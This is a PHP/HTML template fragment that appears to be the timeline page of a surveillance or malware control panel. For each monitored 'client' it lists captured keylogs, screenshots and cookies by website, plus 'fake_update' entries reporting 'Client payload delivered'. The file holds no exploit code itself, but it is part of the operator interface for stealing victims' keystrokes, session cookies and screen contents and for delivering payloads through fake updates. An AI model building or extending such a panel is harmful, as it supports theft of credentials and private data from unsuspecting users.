<div class="row">
            <div class="col-md-12">
              <!-- The time line -->
              <ul class="timeline">
            <!-- timeline time label -->
                <li class="time-label">
                  <span class="bg-green">
                    Started Monitoring: <?=time_elapsed_string($data["client"]["first_added"]) ?>
                  </span>
                </li>
                <!-- /.timeline-label -->
                <!-- timeline item -->
                <? /*
                <li>
                  <i class="fa fa-info bg-blue"></i>
                  <div class="timeline-item">
                    <span class="time"><i class="fa fa-clock-o"></i> 12:05</span>
                    <h3 class="timeline-header"><a href="#">Support Team</a> sent you an email</h3>
                    <div class="timeline-body">
                      Etsy doostang zoodles disqus groupon greplin oooj voxy zoodles,
                      weebly ning heekya handango imeem plugg dopplr jibjab, movity
                      jajah plickers sifteo edmodo ifttt zimbra. Babblely odeo kaboodle
                      quora plaxo ideeli hulu weebly balihoo...
                    </div>
                    <div class="timeline-footer">
                      <a class="btn btn-primary btn-xs">Read more</a>
                      <a class="btn btn-danger btn-xs">Delete</a>
                    </div>
                  </div>
                </li>
                */ ?>
                <!-- END timeline item -->
                
                <? foreach ($data["timeline"] as $key => $value) { ?>
                <!-- timeline item -->
                <li>
                  <i class="fa <?=timeline_icon($value["type"]) ?>"></i>
                  <div class="timeline-item">
                    <span class="time"><i class="fa fa-clock-o"></i> <?=time_elapsed_string($value["time"]) ?></span>
                    <? 
               //     if($value["type"] == "keylog") echo '<h3 class="timeline-header no-border">Captured <a href="#">keylog</a> on <a href="'.$value["website"].'"><button class="btn btn-sm btn-success">'.$value["website"].'</button></a></h3>';  
 
                    if($value["type"] == "keylog") echo '<h3 class="timeline-header no-border">Captured <a href="keylog.php?id='.$value["unique_id"].'">keylog</a> on <a href="'.$value["website"].'"><span class="label label-success">'.$value["website"].'</span></a></h3>';  
                    if($value["type"] == "screencap") echo '<h3 class="timeline-header no-border">Captured <a href="screenshots.php?id='.$value["unique_id"].'">screencaps</a> on <a href="'.$value["website"].'"><span class="label bg-navy">'.$value["website"].'</span></a></h3>';  
                    if($value["type"] == "cookie") echo '<h3 class="timeline-header no-border"> Captured <a href="v-cookie.php?id='.$value["unique_id"].'">cookie</a> on <a href="'.$value["website"].'"><span class="label bg-aqua">'.$value["website"].'</span></a></h3>';  
                    if($value["type"] == "fake_update") echo '<h3 class="timeline-header no-border"> Client payload delivered on <a href="'.$value["website"].'"><span class="label bg-red">'.$value["website"].'</span></a></h3>';  
              //      if($value["type"] == "screencap") echo '<h3 class="timeline-header no-border">Captured <a href="#">screencaps</a> on <a href="'.$value["website"].'"><button class="btn btn-sm bg-navy">'.$value["website"].'</button></a></h3>';  
              //      if($value["type"] == "cookie") echo '<h3 class="timeline-header no-border"> Captured <a href="#">cookie</a> on <a href="'.$value["website"].'"><button class="btn btn-sm bg-aqua">'.$value["website"].'</button></a></h3>';  

                    ?>
                  </div>
                </li>
                <? } ?>
                <!-- END timeline item -->
                <li>
                  <i class="fa fa-clock-o bg-gray"></i>
                </li>
              </ul>
            </div><!-- /.col -->
          </div>


          <div class="row">
            <div class="col-xs-12">
                  <?=$data["pagination"] ?>
            </div>
           </div>
